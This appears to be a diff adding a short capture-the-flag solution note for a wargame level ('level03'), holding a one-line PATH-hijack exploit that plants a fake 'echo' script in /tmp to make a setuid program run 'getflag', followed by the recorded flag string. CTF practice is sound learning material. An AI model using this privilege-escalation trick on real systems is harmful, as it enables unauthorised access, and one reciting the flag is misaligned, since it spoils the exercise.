@@ -1,0 +1,3 @@
+echo '#!/bin/bash' > /tmp/echo ; echo 'getflag' >> /tmp/echo && ./level03
+
+flag03 = qi0maab88jeaj46qoumi7maus
